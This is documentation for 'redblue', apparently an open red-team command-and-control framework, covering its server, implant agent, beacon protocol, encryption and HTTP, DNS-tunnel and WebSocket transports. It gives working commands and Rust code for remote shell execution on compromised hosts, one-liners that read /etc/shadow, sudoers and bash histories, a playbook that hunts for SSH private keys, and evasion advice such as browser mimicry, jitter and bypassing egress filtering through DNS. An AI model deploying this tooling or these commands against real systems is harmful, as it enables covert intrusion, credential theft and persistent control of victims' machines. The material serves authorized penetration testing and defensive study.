# redblue C2 Agent Documentation

Technical documentation for the redblue Command & Control (C2) agent system.

> **WARNING**: This tool is for authorized penetration testing, CTF competitions, and security research ONLY. Unauthorized use is illegal.

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [Quick Start](#quick-start)
- [Server Configuration](#server-configuration)
- [Agent Configuration](#agent-configuration)
- [Operator Guide](#operator-guide) ← **What you can do with connected agents**
- [Communication Protocol](#communication-protocol)
- [Transports](#transports)
- [Cryptography](#cryptography)
- [Commands](#commands)
- [API Reference](#api-reference)

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                            C2 SERVER                                    │
│                     src/agent/server/mod.rs                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐                │
│   │   HTTP      │    │   Session   │    │   Command   │                │
│   │  Listener   │───▶│   Manager   │───▶│    Queue    │                │
│   └─────────────┘    └─────────────┘    └─────────────┘                │
│          │                  │                  │                        │
│          ▼                  ▼                  ▼                        │
│   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐                │
│   │   Crypto    │    │   RedDB     │    │  Playbook   │                │
│   │  (X25519)   │    │  Storage    │    │  Executor   │                │
│   └─────────────┘    └─────────────┘    └─────────────┘                │
│                                                                         │
└───────────────────────────────┬─────────────────────────────────────────┘
                                │
                    ┌───────────┼───────────┐
                    │           │           │
                   HTTP        DNS      WebSocket
                    │           │           │
                    └───────────┼───────────┘
                                │
┌───────────────────────────────┴─────────────────────────────────────────┐
│                            C2 AGENT                                     │
│                     src/agent/client/mod.rs                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐                │
│   │  Transport  │    │   Beacon    │    │   Command   │                │
│   │   Chain     │───▶│    Loop     │───▶│  Executor   │                │
│   └─────────────┘    └─────────────┘    └─────────────┘                │
│          │                  │                  │                        │
│          ▼                  ▼                  ▼                        │
│   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐                │
│   │   Crypto    │    │   Jitter    │    │  Accessors  │                │
│   │  (Ratchet)  │    │   Engine    │    │  (FS/Net)   │                │
│   └─────────────┘    └─────────────┘    └─────────────┘                │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Components

| Component | Location | Description |
|-----------|----------|-------------|
| Server | `src/agent/server/mod.rs` | HTTP listener, session management, command dispatch |
| Client | `src/agent/client/mod.rs` | Beacon loop, command execution, transport handling |
| Protocol | `src/agent/protocol.rs` | Message formats, session IDs, replay protection |
| Crypto | `src/agent/crypto.rs` | X25519 key exchange, ChaCha20-Poly1305 encryption |
| Ratchet | `src/agent/ratchet.rs` | Double Ratchet for forward secrecy |
| Transports | `src/agent/transport/` | HTTP, DNS tunneling, WebSocket |

---

## Quick Start

### 1. Start the C2 Server

```bash
# Basic server on default port 4444
rb agent server start

# Custom port and bind address
rb agent server start --bind 0.0.0.0:8443

# With TLS (recommended for production)
rb agent server start --bind 0.0.0.0:443 --tls --cert cert.pem --key key.pem

# With database persistence
rb agent server start --db /path/to/c2.rbdb
```

### 2. Deploy an Agent

```bash
# Generate agent configuration
rb agent generate --server https://c2.example.com:8443 --output agent.bin

# Or run directly (for testing)
rb agent connect --server http://127.0.0.1:4444
```

### 3. Interact with Agents

```bash
# List connected agents
rb agent list

# Send command to specific agent
rb agent exec <session-id> whoami

# Send command to all agents
rb agent broadcast "hostname"

# Interactive shell with agent
rb agent shell <session-id>
```

---

## Server Configuration

### AgentServerConfig

```rust
use redblue::agent::server::{AgentServer, AgentServerConfig};

let config = AgentServerConfig {
    // Network binding
    bind_addr: "0.0.0.0:4444".parse().unwrap(),

    // TLS settings
    use_tls: true,
    cert_path: Some("/path/to/cert.pem".into()),
    key_path: Some("/path/to/key.pem".into()),

    // Database persistence
    db_path: Some("/path/to/c2.rbdb".into()),
};

let mut server = AgentServer::new(config);
```

### Starting the Server

```rust
use std::sync::mpsc;

// Create shutdown channel
let (shutdown_tx, shutdown_rx) = mpsc::channel();

// Start server (blocking)
server.start(Some(shutdown_rx))?;

// To stop from another thread:
// shutdown_tx.send(()).unwrap();
```

### Server API Methods

```rust
// List all connected agents
let agents: Vec<SessionInfo> = server.list_agents();

// Get specific agent info
let agent: Option<&ClientState> = server.get_agent(&session_id);

// Queue command for agent
server.add_command_to_session(
    "session-id-hex",
    AgentCommand {
        id: uuid::new_v4().to_string(),
        action: "shell".to_string(),
        args: vec!["whoami".to_string()],
    }
)?;

// Broadcast command to all agents
server.broadcast_command(AgentCommand {
    id: uuid::new_v4().to_string(),
    action: "shell".to_string(),
    args: vec!["hostname".to_string()],
});
```

### Server Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/beacon` | POST | Main C2 communication endpoint |
| `/health` | GET | Server health check (optional) |

---

## Agent Configuration

### AgentConfig

```rust
use redblue::agent::client::{AgentClient, AgentConfig};
use std::time::Duration;

let config = AgentConfig {
    // C2 server URL
    server_url: "https://c2.example.com:8443".to_string(),

    // Beacon interval (time between check-ins)
    interval: Duration::from_secs(60),

    // Jitter factor (0.0 - 1.0)
    // With 0.2 jitter, 60s interval becomes 48-72s
    jitter: 0.2,
};

let mut agent = AgentClient::new(config);
```

### Starting the Agent

```rust
// Start agent (blocking - runs beacon loop)
agent.start()?;
```

### Agent Lifecycle

```
1. Generate SessionId (128-bit random)
         │
         ▼
2. Perform Handshake
   ├── Send X25519 public key
   ├── Receive server public key
   └── Derive shared secret
         │
         ▼
3. Enter Beacon Loop
   ├── Sleep (interval ± jitter)
   ├── Send encrypted heartbeat
   ├── Receive encrypted commands
   ├── Execute commands
   └── Send encrypted responses
         │
         ▼
4. Repeat step 3 until terminated
```

---

## Operator Guide

This section describes what you can do when controlling agents from the C2 server.

### Interactive Shell (TUI)

> **TODO**: TUI interface is planned but not yet implemented. Currently use programmatic API.

```bash
# Future TUI interface (planned)
rb agent shell                    # Interactive shell to manage all agents
rb agent shell <session-id>       # Interactive shell with specific agent
```

### Agent Management

```bash
# List all connected agents
rb agent list

# Output:
# SESSION ID                        | IP ADDRESS     | LAST SEEN  | STATUS
# ----------------------------------|----------------|------------|--------
# a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4  | 192.168.1.105  | 2s ago     | active
# f6e5d4c3b2a1f6e5d4c3b2a1f6e5d4c3  | 10.0.0.42      | 45s ago    | active

# Get detailed info about an agent
rb agent info <session-id>

# Disconnect/kill an agent
rb agent kill <session-id>
```

### Command Execution

#### Shell Commands

Execute system commands on the target:

```bash
# Single command
rb agent exec <session-id> whoami
rb agent exec <session-id> "cat /etc/passwd"
rb agent exec <session-id> "ls -la /home"

# Command with arguments
rb agent exec <session-id> ls -la /var/log

# Broadcast to all agents
rb agent broadcast "hostname && whoami"
```

#### File System Operations

```bash
# List directory contents
rb agent exec <session-id> access file list path=/home/user

# Read file content
rb agent exec <session-id> access file read path=/etc/passwd

# Search for files
rb agent exec <session-id> access file search path=/home pattern=.ssh

# Hash a file (md5, sha1, sha256)
rb agent exec <session-id> access file hash path=/bin/bash algorithm=sha256
```

**File Accessor Methods:**

| Method | Arguments | Description |
|--------|-----------|-------------|
| `list` | `path` | List directory contents with metadata |
| `read` | `path` | Read file content as text |
| `hash` | `path`, `algorithm` | Calculate MD5/SHA1/SHA256 hash |
| `search` | `path`, `pattern` | Recursive file search |

#### Process Operations

```bash
# List all processes
rb agent exec <session-id> access process list

# Show process tree
rb agent exec <session-id> access process tree
```

**Process Information Returned:**
```json
{
  "pid": 1234,
  "ppid": 1,
  "name": "nginx",
  "state": "S",
  "uid": 33,
  "cmdline": ["nginx", "-g", "daemon off;"]
}
```

#### Network Reconnaissance

```bash
# List network connections (TCP/UDP)
rb agent exec <session-id> access network connections

# Show ARP cache
rb agent exec <session-id> access network arp

# List network interfaces
rb agent exec <session-id> access network interfaces
```

**Connection Information:**
```json
{
  "protocol": "tcp",
  "local_address": "192.168.1.105:22",
  "remote_address": "10.0.0.1:54321",
  "state": "ESTABLISHED",
  "uid": 0,
  "pid": 1234
}
```

**Interface Information:**
```json
{
  "name": "eth0",
  "mac": "00:11:22:33:44:55",
  "mtu": "1500",
  "state": "up"
}
```

#### Service Enumeration (Linux)

```bash
# List systemd services
rb agent exec <session-id> access service list
```

**Service Information:**
```json
{
  "name": "nginx",
  "path": "/lib/systemd/system/nginx.service",
  "description": "A high performance web server",
  "type": "systemd"
}
```

#### Registry Operations (Windows)

```bash
# Read registry key
rb agent exec <session-id> access registry read path="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"

# List subkeys
rb agent exec <session-id> access registry list path="HKCU\\Software"
```

### Playbook Execution

Execute automated playbooks on agents:

```bash
# Execute a playbook
rb agent playbook <session-id> /path/to/playbook.yaml

# Execute built-in playbook
rb agent playbook <session-id> --builtin recon-basic
```

**Example Playbook:**
```yaml
name: basic-recon
description: Basic reconnaissance on target

steps:
  - name: Get system info
    action: shell
    command: "uname -a && hostname && id"

  - name: List users
    action: shell
    command: "cat /etc/passwd | grep -v nologin"

  - name: Network connections
    action: accessor
    accessor: network
    method: connections

  - name: List processes
    action: accessor
    accessor: process
    method: list

  - name: Find SSH keys
    action: accessor
    accessor: file
    method: search
    args:
      path: /home
      pattern: id_rsa
```

### Complete Accessor Reference

| Accessor | Method | Description | Platform |
|----------|--------|-------------|----------|
| **file** | `list` | List directory contents | All |
| **file** | `read` | Read file content | All |
| **file** | `hash` | Calculate file hash | All |
| **file** | `search` | Recursive file search | All |
| **process** | `list` | List all processes | Linux |
| **process** | `tree` | Show process tree | Linux |
| **network** | `connections` | List TCP/UDP connections | Linux |
| **network** | `arp` | Show ARP cache | Linux |
| **network** | `interfaces` | List network interfaces | Linux |
| **service** | `list` | List systemd services | Linux |
| **registry** | `read` | Read registry key | Windows |
| **registry** | `list` | List registry subkeys | Windows |

### Useful One-Liners

```bash
# System enumeration
rb agent exec <sid> "uname -a && cat /etc/os-release"
rb agent exec <sid> "cat /etc/passwd && cat /etc/shadow 2>/dev/null"
rb agent exec <sid> "crontab -l && ls -la /etc/cron*"

# Network enumeration
rb agent exec <sid> "ip addr && ip route && cat /etc/resolv.conf"
rb agent exec <sid> "ss -tulpn"
rb agent exec <sid> "iptables -L -n 2>/dev/null"

# User enumeration
rb agent exec <sid> "w && last -10"
rb agent exec <sid> "cat /etc/sudoers 2>/dev/null"
rb agent exec <sid> "find /home -name .bash_history -exec cat {} \\;"

# Find sensitive files
rb agent exec <sid> access file search path=/home pattern=.ssh
rb agent exec <sid> access file search path=/var pattern=.env
rb agent exec <sid> access file search path=/ pattern=id_rsa

# Persistence check
rb agent exec <sid> "cat /etc/rc.local 2>/dev/null"
rb agent exec <sid> "systemctl list-unit-files --state=enabled"
```

### Programmatic Control (Rust API)

```rust
use redblue::agent::server::{AgentServer, AgentServerConfig};
use redblue::agent::protocol::AgentCommand;
use std::sync::mpsc;
use uuid::Uuid;

fn main() -> Result<(), String> {
    // Start server
    let config = AgentServerConfig::default();
    let mut server = AgentServer::new(config);

    let (shutdown_tx, shutdown_rx) = mpsc::channel();

    // Start server in background thread
    let server_handle = std::thread::spawn(move || {
        server.start(Some(shutdown_rx))
    });

    // Wait for agents to connect...
    std::thread::sleep(std::time::Duration::from_secs(60));

    // List connected agents
    let agents = server.list_agents();
    for agent in &agents {
        println!("Agent: {} @ {}", agent.session_id, agent.remote_addr);
    }

    // Send command to first agent
    if let Some(agent) = agents.first() {
        server.add_command_to_session(
            &agent.session_id,
            AgentCommand {
                id: Uuid::new_v4().to_string(),
                action: "shell".to_string(),
                args: vec!["whoami".to_string()],
            }
        )?;
    }

    // Broadcast to all agents
    server.broadcast_command(AgentCommand {
        id: Uuid::new_v4().to_string(),
        action: "shell".to_string(),
        args: vec!["hostname".to_string()],
    });

    // Shutdown
    shutdown_tx.send(()).unwrap();
    server_handle.join().unwrap()
}
```

### Security Considerations for Operators

1. **Use TLS** - Always use encrypted transport in production
2. **Rotate endpoints** - Change C2 endpoints periodically
3. **Monitor beacon times** - Watch for timing anomalies
4. **Limit commands** - Minimize noisy commands that might trigger alerts
5. **Clean up** - Remove agents when done with engagement
6. **Logging** - Maintain operation logs for reporting

---

## Communication Protocol

### Protocol Version 2

All messages use the `BeaconMessage` structure:

```rust
pub struct BeaconMessage {
    pub magic: u32,              // 0x52424C55 ("RBLU")
    pub version: u8,             // Protocol version (2)
    pub msg_type: MessageType,   // KeyExchange, Beacon, Response, Command
    pub flags: u16,              // Feature flags
    pub session_id: SessionId,   // 128-bit random identifier
    pub timestamp: u64,          // Unix timestamp (seconds)
    pub sequence: u32,           // Message sequence number
    pub dh_public: Option<[u8; 32]>, // Ephemeral DH key (for ratchet)
    pub payload: Vec<u8>,        // Encrypted payload
    pub tag: [u8; 16],           // Poly1305 authentication tag
}
```

### Message Types

| Type | Value | Direction | Description |
|------|-------|-----------|-------------|
| `KeyExchange` | 0 | Both | Initial handshake |
| `Beacon` | 1 | Agent → Server | Heartbeat / check-in |
| `Response` | 2 | Agent → Server | Command execution results |
| `Command` | 3 | Server → Agent | Commands to execute |

### Feature Flags

```rust
pub const FLAG_HAS_DH_KEY: u16    = 0x0001;  // Message includes DH public key
pub const FLAG_EXPECTS_ACK: u16   = 0x0002;  // Sender expects acknowledgment
pub const FLAG_IS_ACK: u16        = 0x0004;  // This is an acknowledgment
pub const FLAG_COMPRESSED: u16    = 0x0008;  // Payload is compressed
pub const FLAG_RATCHET_MODE: u16  = 0x0010;  // Using Double Ratchet
```

### Session ID

```rust
pub struct SessionId([u8; 16]);

impl SessionId {
    // Generate cryptographically random session ID
    pub fn generate() -> Self;

    // Convert to hex string for display/storage
    pub fn to_hex(&self) -> String;

    // Parse from hex string
    pub fn from_hex(hex: &str) -> Result<Self, String>;
}
```

### Handshake Flow

```
Agent                                    Server
  │                                        │
  │  BeaconMessage {                       │
  │    msg_type: KeyExchange,              │
  │    payload: [agent_public_key; 32],    │
  │  }                                     │
  │ ─────────────────────────────────────▶ │
  │                                        │
  │                                        │ Derive shared_secret
  │                                        │ = X25519(server_priv, agent_pub)
  │                                        │
  │  HTTP 200                              │
  │  Body: [server_public_key; 32]         │
  │ ◀───────────────────────────────────── │
  │                                        │
  │ Derive shared_secret                   │
  │ = X25519(agent_priv, server_pub)       │
  │                                        │
  │  (Session established)                 │
  │                                        │
```

### Beacon Flow

```
Agent                                    Server
  │                                        │
  │  BeaconMessage {                       │
  │    msg_type: Beacon,                   │
  │    payload: encrypt("HEARTBEAT"),      │
  │    sequence: N,                        │
  │  }                                     │
  │ ─────────────────────────────────────▶ │
  │                                        │
  │                                        │ Validate timestamp
  │                                        │ Check sequence (replay)
  │                                        │ Decrypt payload
  │                                        │ Queue any pending commands
  │                                        │
  │  BeaconMessage {                       │
  │    msg_type: Command,                  │
  │    payload: encrypt([commands]),       │
  │  }                                     │
  │ ◀───────────────────────────────────── │
  │                                        │
  │ Decrypt payload                        │
  │ Execute commands                       │
  │                                        │
  │  BeaconMessage {                       │
  │    msg_type: Response,                 │
  │    payload: encrypt([responses]),      │
  │  }                                     │
  │ ─────────────────────────────────────▶ │
  │                                        │
```

---

## Transports

### Transport Trait

All transports implement the `Transport` trait:

```rust
pub trait Transport: Send + Sync {
    fn send(&mut self, data: &[u8]) -> TransportResult<Vec<u8>>;
    fn is_connected(&self) -> bool;
    fn reconnect(&mut self) -> TransportResult<()>;
    fn name(&self) -> &str;
    fn current_endpoint(&self) -> String;
    fn rotate_endpoint(&mut self) -> bool;
    fn close(&mut self);
}
```

### HTTP Transport

Standard HTTP/HTTPS communication with endpoint rotation.

```rust
use redblue::agent::transport::http::{HttpTransport, HttpTransportConfig};

// Basic configuration
let transport = HttpTransport::with_url("https://c2.example.com:8443");

// Advanced configuration
let config = HttpTransportConfig::new("https://c2.example.com")
    .with_endpoint("/api/sync")
    .with_endpoint("/status")
    .with_endpoint("/health")
    .with_user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)...")
    .with_tls()
    .with_timeout(Duration::from_secs(30))
    .with_rotation(true);  // Rotate endpoint each request

let transport = HttpTransport::new(config);
```

#### Browser Profiles

```rust
use redblue::agent::transport::http::HttpProfileBuilder;

// Mimic Chrome browser
let chrome = HttpProfileBuilder::chrome("https://c2.example.com");

// Mimic Firefox browser
let firefox = HttpProfileBuilder::firefox("https://c2.example.com");

// Mimic curl
let curl = HttpProfileBuilder::curl("https://c2.example.com");

// CDN-style rotation
let cdn = HttpProfileBuilder::cdn_rotation(
    "https://cdn.example.com",
    &["/static/img", "/api/v1", "/health"]
);
```

### DNS Transport

DNS tunneling using TXT records. Useful for bypassing firewalls.

```rust
use redblue::agent::transport::dns::{DnsTransport, DnsTransportConfig};

// Basic configuration
let transport = DnsTransport::with_domain("c2.example.com");

// Advanced configuration
let config = DnsTransportConfig::new("c2.example.com")
    .with_resolver("8.8.8.8")
    .with_port(53)
    .with_delay(Duration::from_millis(100));

let transport = DnsTransport::new(config);
```

#### DNS Query Format

```
<base32_data>.<chunk_idx>-<total>.<sequence>.<session_id>.<domain> TXT

Example:
mzxw6ytboi.0-1.42.abc123def456.c2.example.com TXT
```

#### DNS Profiles

```rust
use redblue::agent::transport::dns::DnsProfileBuilder;

// Standard (Google DNS)
let standard = DnsProfileBuilder::standard("c2.example.com");

// Cloudflare DNS
let cloudflare = DnsProfileBuilder::cloudflare_dns("c2.example.com");

// Stealthy (slow queries)
let stealthy = DnsProfileBuilder::stealthy("c2.example.com");
```

### WebSocket Transport

Full-duplex communication for real-time interaction.

```rust
use redblue::agent::transport::websocket::{WebSocketTransport, WebSocketTransportConfig};

// Basic configuration
let transport = WebSocketTransport::with_url("wss://c2.example.com/ws");

// Advanced configuration
let config = WebSocketTransportConfig::new("wss://c2.example.com")
    .with_path("/ws")
    .with_origin("https://legitimate-site.com")
    .with_ping_interval(Duration::from_secs(30))
    .with_auto_reconnect(true);

let transport = WebSocketTransport::new(config);
```

### Transport Chain (Fallback)

Automatic fallback between transports:

```rust
use redblue::agent::transport::{TransportChain, http::HttpTransport, dns::DnsTransport};

let mut chain = TransportChain::new()
    .with_auto_fallback(true)
    .with_fallback_threshold(3);  // Fallback after 3 failures

// Primary: HTTP
chain.add_transport(Box::new(
    HttpTransport::with_url("https://c2.example.com")
));

// Fallback: DNS tunneling
chain.add_transport(Box::new(
    DnsTransport::with_domain("c2.example.com")
));

// Use the chain
let response = chain.send(data)?;
```

---

## Cryptography

### Key Exchange (X25519)

```rust
// Agent generates keypair
let agent_private: [u8; 32] = generate_random_bytes();
let agent_public: [u8; 32] = x25519_base(agent_private);

// Server generates keypair
let server_private: [u8; 32] = generate_random_bytes();
let server_public: [u8; 32] = x25519_base(server_private);

// Both derive same shared secret
let shared_secret = x25519(agent_private, server_public);
// = x25519(server_private, agent_public)
```

### Encryption (ChaCha20-Poly1305)

```rust
// Encrypt
let nonce: [u8; 12] = generate_random_bytes();
let (ciphertext, tag) = chacha20poly1305_encrypt(
    &session_key,
    &nonce,
    &plaintext,
    &additional_data
);

// Decrypt
let plaintext = chacha20poly1305_decrypt(
    &session_key,
    &nonce,
    &ciphertext,
    &tag,
    &additional_data
)?;
```

### Double Ratchet (Forward Secrecy)

The Double Ratchet provides forward secrecy - compromising one message key doesn't compromise past or future messages.

```rust
use redblue::agent::ratchet::RatchetState;

// Initialize ratchet (after handshake)
let mut ratchet = RatchetState::new_initiator(&shared_secret, &their_public_key);

// Encrypt message (advances ratchet)
let (header, ciphertext) = ratchet.encrypt(plaintext)?;

// Decrypt message (may advance ratchet)
let plaintext = ratchet.decrypt(&header, &ciphertext)?;
```

#### Ratchet State

```rust
pub struct RatchetState {
    // DH Ratchet
    dh_keypair: X25519KeyPair,
    dh_remote: Option<[u8; 32]>,
    root_key: [u8; 32],

    // Sending chain
    send_chain_key: Option<[u8; 32]>,
    send_n: u32,

    // Receiving chain
    recv_chain_key: Option<[u8; 32]>,
    recv_n: u32,

    // Skipped message keys (for out-of-order delivery)
    skipped_keys: HashMap<([u8; 8], u32), [u8; 32]>,
}
```

### Security Features

| Feature | Implementation | Purpose |
|---------|----------------|---------|
| Key Exchange | X25519 ECDH | Secure shared secret derivation |
| Encryption | ChaCha20-Poly1305 | Authenticated encryption |
| Forward Secrecy | Double Ratchet | Past messages stay secure if key compromised |
| Replay Protection | Sequence numbers | Prevent message replay attacks |
| Timestamp Validation | 5-minute drift | Prevent old message injection |
| Session ID | 128-bit random | Unpredictable session identifiers |

---

## Commands

### Command Structure

```rust
pub struct AgentCommand {
    pub id: String,        // Unique command ID
    pub action: String,    // Command type
    pub args: Vec<String>, // Arguments
}

pub struct AgentResponse {
    pub command_id: String,
    pub success: bool,
    pub output: String,
    pub error: Option<String>,
}
```

### Available Commands

#### Shell Execution

```rust
// Execute shell command
AgentCommand {
    id: "cmd-001",
    action: "shell",  // or "exec"
    args: vec!["whoami"],
}

// With arguments
AgentCommand {
    id: "cmd-002",
    action: "shell",
    args: vec!["ls", "-la", "/etc"],
}
```

#### Playbook Execution

```rust
// Execute playbook
AgentCommand {
    id: "cmd-003",
    action: "playbook",
    args: vec![serde_json::to_string(&playbook)?],
}
```

#### Accessor Commands

```rust
// File operations
AgentCommand {
    id: "cmd-004",
    action: "access",
    args: vec!["file", "read", "path=/etc/passwd"],
}

// Process listing
AgentCommand {
    id: "cmd-005",
    action: "access",
    args: vec!["process", "list"],
}

// Network info
AgentCommand {
    id: "cmd-006",
    action: "access",
    args: vec!["network", "interfaces"],
}
```

### Accessor Types

| Accessor | Methods | Description |
|----------|---------|-------------|
| `file` | read, write, list, delete | File system operations |
| `process` | list, kill, spawn | Process management |
| `network` | interfaces, connections, arp | Network information |
| `service` | list, start, stop | Service management |
| `registry` | read, write, delete | Windows registry (Windows only) |

---

## API Reference

### Server Module

```rust
// src/agent/server/mod.rs

pub struct AgentServer {
    pub config: AgentServerConfig,
    pub clients: Arc<Mutex<HashMap<String, ClientState>>>,
}

impl AgentServer {
    pub fn new(config: AgentServerConfig) -> Self;
    pub fn start(&mut self, shutdown: Option<Receiver<()>>) -> Result<(), String>;
    pub fn list_agents(&self) -> Vec<SessionInfo>;
    pub fn get_agent(&self, session_id: &str) -> Option<&ClientState>;
    pub fn add_command_to_session(&self, session_id: &str, cmd: AgentCommand) -> Result<(), String>;
    pub fn broadcast_command(&self, cmd: AgentCommand);
}
```

### Client Module

```rust
// src/agent/client/mod.rs

pub struct AgentClient {
    pub config: AgentConfig,
    pub crypto: AgentCrypto,
    pub session_id: SessionId,
}

impl AgentClient {
    pub fn new(config: AgentConfig) -> Self;
    pub fn start(&mut self) -> Result<(), String>;
    pub fn perform_handshake(&mut self) -> Result<(), String>;
    pub fn send_beacon(&self) -> Result<(), String>;
}
```

### Protocol Module

```rust
// src/agent/protocol.rs

pub struct SessionId([u8; 16]);
pub struct BeaconMessage { /* ... */ }
pub struct SequenceTracker { /* ... */ }

pub fn validate_timestamp(msg_timestamp: u64) -> Result<(), String>;
```

### Crypto Module

```rust
// src/agent/crypto.rs

pub struct AgentCrypto {
    pub private_key: [u8; 32],
    pub public_key: [u8; 32],
    pub session_key: Option<[u8; 32]>,
}

impl AgentCrypto {
    pub fn new() -> Self;                    // Legacy mode
    pub fn new_ratchet() -> Self;            // Ratchet mode
    pub fn derive_session_key(&mut self, their_public: &[u8; 32]);
    pub fn encrypt(&self, plaintext: &[u8]) -> Result<(Vec<u8>, [u8; 16]), String>;
    pub fn decrypt(&self, ciphertext: &[u8], tag: &[u8; 16]) -> Result<Vec<u8>, String>;
}
```

### Transport Module

```rust
// src/agent/transport/mod.rs

pub trait Transport: Send + Sync {
    fn send(&mut self, data: &[u8]) -> TransportResult<Vec<u8>>;
    fn is_connected(&self) -> bool;
    fn reconnect(&mut self) -> TransportResult<()>;
    fn name(&self) -> &str;
    fn current_endpoint(&self) -> String;
    fn rotate_endpoint(&mut self) -> bool;
    fn close(&mut self);
}

pub struct TransportChain { /* ... */ }
```

---

## Examples

### Minimal Server

```rust
use redblue::agent::server::{AgentServer, AgentServerConfig};

fn main() -> Result<(), String> {
    let config = AgentServerConfig {
        bind_addr: "0.0.0.0:4444".parse().unwrap(),
        use_tls: false,
        cert_path: None,
        key_path: None,
        db_path: None,
    };

    let mut server = AgentServer::new(config);
    println!("C2 Server starting on port 4444...");
    server.start(None)
}
```

### Minimal Agent

```rust
use redblue::agent::client::{AgentClient, AgentConfig};
use std::time::Duration;

fn main() -> Result<(), String> {
    let config = AgentConfig {
        server_url: "http://127.0.0.1:4444".to_string(),
        interval: Duration::from_secs(30),
        jitter: 0.1,
    };

    let mut agent = AgentClient::new(config);
    agent.start()
}
```

### Agent with Transport Fallback

```rust
use redblue::agent::transport::{
    TransportChain,
    http::HttpTransport,
    dns::DnsTransport,
    websocket::WebSocketTransport,
};

fn create_transport_chain() -> TransportChain {
    let mut chain = TransportChain::new()
        .with_auto_fallback(true)
        .with_fallback_threshold(3);

    // Primary: HTTPS
    chain.add_transport(Box::new(
        HttpTransport::with_url("https://c2.example.com:443")
    ));

    // Fallback 1: WebSocket
    chain.add_transport(Box::new(
        WebSocketTransport::with_url("wss://c2.example.com/ws")
    ));

    // Fallback 2: DNS tunneling
    chain.add_transport(Box::new(
        DnsTransport::with_domain("c2.example.com")
    ));

    chain
}
```

---

## Security Considerations

1. **Always use TLS in production** - HTTP traffic is visible to network monitors
2. **Use certificate pinning** - Prevents MITM attacks
3. **Rotate endpoints** - Makes traffic analysis harder
4. **Use jitter** - Prevents beacon timing analysis
5. **Enable Double Ratchet** - Provides forward secrecy
6. **Validate timestamps** - Prevents replay attacks
7. **Use DNS transport through corporate DNS** - May bypass egress filtering

---

## Troubleshooting

### Agent can't connect

1. Check server is running: `netstat -tlnp | grep 4444`
2. Check firewall rules: `iptables -L -n`
3. Test connectivity: `curl http://server:4444/beacon`
4. Check TLS certificate validity

### Handshake fails

1. Check protocol version compatibility
2. Verify server public key is received (32 bytes)
3. Check for network proxies intercepting traffic

### Commands not executing

1. Check command queue on server
2. Verify agent is checking in (beacon logs)
3. Check command format matches expected structure

### DNS transport not working

1. Verify DNS server is receiving queries: `tcpdump -i any port 53`
2. Check TXT record responses from authoritative DNS
3. Ensure base32 encoding/decoding is correct

---

## File Structure

```
src/agent/
├── mod.rs              # Module exports
├── client/
│   └── mod.rs          # Agent client implementation
├── server/
│   └── mod.rs          # C2 server implementation
├── protocol.rs         # Message formats, SessionId
├── crypto.rs           # Encryption (legacy + ratchet)
├── ratchet.rs          # Double Ratchet implementation
└── transport/
    ├── mod.rs          # Transport trait, TransportChain
    ├── http.rs         # HTTP/HTTPS transport
    ├── dns.rs          # DNS tunneling transport
    └── websocket.rs    # WebSocket transport
```

---

## License

This tool is part of redblue and is intended for authorized security testing only. Unauthorized use against systems you don't own or have permission to test is illegal.
